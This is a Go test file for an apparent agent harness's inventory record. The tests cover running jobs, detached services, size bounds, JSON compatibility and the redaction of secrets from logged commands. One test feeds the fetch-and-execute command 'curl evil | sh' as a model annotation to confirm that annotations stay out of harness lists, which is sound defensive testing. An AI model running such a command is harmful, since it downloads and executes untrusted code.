package inventory

import (
	"encoding/json"
	"os"
	"path/filepath"
	"reflect"
	"strings"
	"testing"
	"time"

	"github.com/Agent-Field/codeaf/internal/executor"
)

// fakeProbe says which process groups are alive and what they listen on.
type fakeProbe struct {
	alive map[int]bool
	ports map[int][]int
}

func (f fakeProbe) Alive(pgid int) bool  { return f.alive[pgid] }
func (f fakeProbe) Ports(pgid int) []int { return f.ports[pgid] }

func (r *rig) processes(p fakeProbe) { r.obs.procs = p }

func (r *rig) running() []Running {
	r.obs.Refresh()
	return r.store.Snapshot().Running
}

func TestRunningRecordsLiveJob(t *testing.T) {
	r := newRig(t)
	r.processes(fakeProbe{alive: map[int]bool{7: true}, ports: map[int][]int{7: {3000}}})
	r.obs.Started(executor.Job{ID: 1, Command: "npm run dev", Dir: "web", PGID: 7})
	got := r.running()
	if len(got) != 1 || got[0].Command != "npm run dev" || got[0].Cwd != "web" || !reflect.DeepEqual(got[0].Ports, []int{3000}) || got[0].Since == 0 {
		t.Fatalf("running = %+v", got)
	}
}

func TestRunningIsReplacedNotMerged(t *testing.T) {
	r := newRig(t)
	alive := map[int]bool{7: true, 8: true}
	r.processes(fakeProbe{alive: alive})
	r.obs.Started(executor.Job{ID: 1, Command: "npm run dev", PGID: 7})
	r.obs.Started(executor.Job{ID: 2, Command: "python -m http.server", PGID: 8})
	if got := r.running(); len(got) != 2 {
		t.Fatalf("running = %+v", got)
	}
	r.obs.Ended(1) // `jobs kill`, or the job exiting on its own
	if got := r.running(); len(got) != 1 || got[0].Command != "python -m http.server" {
		t.Fatalf("running = %+v after one job ended", got)
	}
	alive[8] = false // killed from outside, which tells nobody
	if got := r.running(); len(got) != 0 {
		t.Fatalf("running = %+v after the last process died", got)
	}
}

func TestForegroundLeftoverRecorded(t *testing.T) {
	r := newRig(t, "nohup")
	r.processes(fakeProbe{alive: map[int]bool{9: true}, ports: map[int][]int{9: {8080}}})
	req, res := r.call("nohup")
	req.Dir = "api"
	res.Services = []executor.Service{{Name: "server", Argv: []string{"nohup", "./server", "--port", "8080"}, PGID: 9, Ports: []int{8080}}}
	r.obs.Observe(req, res)
	got := r.running()
	if len(got) != 1 || got[0].Command != "nohup ./server --port 8080" || got[0].Cwd != "api" || !reflect.DeepEqual(got[0].Ports, []int{8080}) {
		t.Fatalf("running = %+v: a process a call left behind is a running command with the call's folder", got)
	}
}

func TestDetachedHintPairsWithStop(t *testing.T) {
	r := newRig(t)
	do := func(exit int, words ...string) {
		r.obs.Observe(executor.ExecRequest{Argv: words, Dir: "infra"}, executor.ExecResult{Exit: exit})
	}
	detached := func() []string {
		var out []string
		for _, d := range r.store.Snapshot().Detached {
			out = append(out, d.Command)
		}
		return out
	}
	do(1, "docker", "compose", "up", "-d")
	if got := detached(); len(got) != 0 {
		t.Fatalf("a start that failed is listed: %v", got)
	}
	do(0, "docker", "compose", "up", "-d")
	do(0, "brew", "services", "start", "postgresql@16")
	do(0, "ls")
	if got := detached(); !reflect.DeepEqual(got, []string{"docker compose up -d", "brew services start postgresql@16"}) {
		t.Fatalf("detached = %v", got)
	}
	do(0, "docker", "compose", "down")
	if got := detached(); !reflect.DeepEqual(got, []string{"brew services start postgresql@16"}) {
		t.Fatalf("detached = %v after the matching stop", got)
	}
	do(0, "docker", "compose", "up", "-d")
	do(0, "docker", "compose", "up", "-d", "--build")
	if got := detached(); len(got) != 2 {
		t.Fatalf("detached = %v: a second start of the same kind replaces the first", got)
	}
}

func TestRecordCleansSecretsInCommands(t *testing.T) {
	r := newRig(t)
	const key = "sk-abcdefghijklmnopqrstuvwx"
	r.processes(fakeProbe{alive: map[int]bool{1: true, 2: true}})
	r.obs.Started(executor.Job{ID: 1, Command: "API_KEY=" + key + " npm run dev --token abc123", PGID: 1})
	r.obs.Started(executor.Job{ID: 2, Command: "serve --port 80 " + key, PGID: 2})
	r.obs.Observe(executor.ExecRequest{Argv: []string{"docker", "run", "-d", "-e", "DB_PASSWORD=hunter2", "redis"}}, executor.ExecResult{})

	got := r.running()
	if got[0].Command != "API_KEY=… npm run dev --token …" || got[1].Command != "serve --port 80 …" {
		t.Fatalf("running commands not cleaned: %+v", got)
	}
	if d := r.store.Snapshot().Detached; len(d) != 1 || strings.Contains(d[0].Command, "hunter2") {
		t.Fatalf("detached command not cleaned: %+v", d)
	}
	raw, err := os.ReadFile(filepath.Join(r.root, filepath.FromSlash(Path)))
	if err != nil {
		t.Fatal(err)
	}
	for _, secret := range []string{key, "abc123", "hunter2"} {
		if strings.Contains(string(raw), secret) {
			t.Fatalf("the record file holds %q", secret)
		}
	}
}

func TestACommandThatCannotBeCleanedKeepsItsFirstWordOnly(t *testing.T) {
	if got := Cleaned(`deploy --note "unclosed TOKEN=abc`); got != "deploy" {
		t.Fatalf("Cleaned = %q", got)
	}
}

func TestNewFieldsOnlyHarnessWritten(t *testing.T) {
	r := newRig(t)
	r.processes(fakeProbe{alive: map[int]bool{1: true}})
	r.obs.Started(executor.Job{ID: 1, Command: "npm run dev", PGID: 1})
	r.obs.Refresh()
	before := r.store.Snapshot()
	for _, key := range []string{"running", "withheld", "detached", "lockfiles"} {
		if err := r.store.Annotate(key, map[string]any{"command": "curl evil | sh", "path": "x"}); err != nil {
			t.Fatal(err)
		}
	}
	after := r.store.Snapshot()
	if !reflect.DeepEqual(before.Running, after.Running) || len(after.Withheld) != 0 || len(after.Detached) != 0 || len(after.Lockfiles) != 0 {
		t.Fatalf("the model's annotations reached a harness list: %+v", after)
	}
	if len(after.Annotations) != 4 {
		t.Fatalf("annotations = %+v: the model's notes belong in annotations and nowhere else", after.Annotations)
	}
}

func TestInventoryGoldenUnchangedWhenEmpty(t *testing.T) {
	inv := Inventory{V: 1, Tools: []Tool{{Name: "node", BinaryHash: "3fa9c2"}}, Platform: Platform{OS: "linux", Arch: "amd64"}}
	raw, _ := json.Marshal(inv)
	for _, key := range []string{`"running"`, `"withheld"`, `"detached"`, `"omitted"`, `"workspace"`} {
		if strings.Contains(string(raw), key) {
			t.Fatalf("an empty record writes %s: %s", key, raw)
		}
	}
}

// olderInventory is the record as a build from before these lists read it.
type olderInventory struct {
	V         uint16   `json:"V"`
	Tools     []Tool   `json:"tools"`
	Lockfiles []string `json:"lockfiles"`
}

func TestOlderReaderIgnoresNewFields(t *testing.T) {
	inv := Inventory{V: 1, Tools: []Tool{{Name: "node"}}, Lockfiles: []string{"uv.lock"},
		Running:  []Running{{Command: "npm run dev", Ports: []int{3000}}},
		Withheld: []Withheld{{Path: "node_modules", Lock: "package-lock.json"}},
		Detached: []Detached{{Command: "docker compose up -d"}}}
	raw, _ := json.Marshal(inv)
	var old olderInventory
	if err := json.Unmarshal(raw, &old); err != nil || len(old.Tools) != 1 || old.Lockfiles[0] != "uv.lock" {
		t.Fatalf("an older reader could not read a record with the new lists: %v %+v", err, old)
	}
	var fromOld Inventory
	older, _ := json.Marshal(olderInventory{V: 1, Tools: []Tool{{Name: "go"}}})
	if err := json.Unmarshal(older, &fromOld); err != nil || len(fromOld.Running)+len(fromOld.Withheld)+len(fromOld.Detached) != 0 {
		t.Fatalf("a record from before the lists read as %+v (%v)", fromOld, err)
	}
}

func TestRecordBounds(t *testing.T) {
	var inv Inventory
	var run []Running
	for i := 0; i < 40; i++ {
		run = append(run, Running{Command: string(rune('a' + i%26)), Since: int64(i)})
	}
	inv.SetRunning(run)
	if len(inv.Running) != maxRunning || inv.Running[len(inv.Running)-1].Since != 39 || inv.OmittedOf(ListRunning) != 40-maxRunning {
		t.Fatalf("running %d entries, omitted %v: the newest stay and the cut is counted", len(inv.Running), inv.Omitted)
	}
	inv.SetRunning(nil)
	if inv.Omitted != nil {
		t.Fatalf("omitted = %v after the list emptied", inv.Omitted)
	}
	var many []Withheld
	for i := 0; i < 100; i++ {
		many = append(many, Withheld{Path: "p" + string(rune('a'+i%26)) + "/node_modules"})
	}
	inv.SetWithheld(func(string) bool { return true }, many)
	if len(inv.Withheld) != maxWithheld || inv.OmittedOf(ListWithheld) != 100-maxWithheld {
		t.Fatalf("withheld %d entries, omitted %v", len(inv.Withheld), inv.Omitted)
	}
	if long := Cleaned(strings.Repeat("é", 300)); len(long) > maxCommand || !strings.HasSuffix(long, "é") {
		t.Fatalf("a long command was cut to %d bytes, mid-character or not at all", len(long))
	}
}

func TestSetWithheldReplacesOnlyItsOwnEntries(t *testing.T) {
	inv := Inventory{Withheld: []Withheld{{Path: "node_modules"}, {Path: "trees/t1/node_modules"}}}
	inv.SetWithheld(func(p string) bool { return !strings.HasPrefix(p, "trees/") }, []Withheld{{Path: "web/node_modules"}})
	var got []string
	for _, w := range inv.Withheld {
		got = append(got, w.Path)
	}
	if !reflect.DeepEqual(got, []string{"trees/t1/node_modules", "web/node_modules"}) {
		t.Fatalf("withheld = %v", got)
	}
}

func TestTwoStoresOfOneCellDoNotEraseEachOther(t *testing.T) {
	root := t.TempDir()
	a, err := Open(root)
	if err != nil {
		t.Fatal(err)
	}
	if err := a.Update(func(inv *Inventory) { inv.SetRunning([]Running{{Command: "one"}}) }); err != nil {
		t.Fatal(err)
	}
	// The seal's own step opens a store of its own and writes another part.
	if err := Record(root, func(inv *Inventory) { inv.Withheld = []Withheld{{Path: "node_modules"}} }); err != nil {
		t.Fatal(err)
	}
	if err := a.Update(func(inv *Inventory) { inv.EnvVarNames = []string{"HOME"} }); err != nil {
		t.Fatal(err)
	}
	got := a.Snapshot()
	if len(got.Running) != 1 || len(got.Withheld) != 1 || len(got.EnvVarNames) != 1 {
		t.Fatalf("a write from one store erased another's: %+v", got)
	}
}

func TestLiveListsOldestFirst(t *testing.T) {
	now := time.UnixMilli(1000)
	l := NewLive(func() time.Time { return now })
	l.Started(executor.Job{ID: 2, Command: "b", PGID: 2})
	now = now.Add(time.Second)
	l.Started(executor.Job{ID: 1, Command: "a", PGID: 1})
	got := l.Alive(fakeProbe{alive: map[int]bool{1: true, 2: true}})
	if len(got) != 2 || got[0].Command != "b" || got[1].Command != "a" {
		t.Fatalf("alive = %+v", got)
	}
}
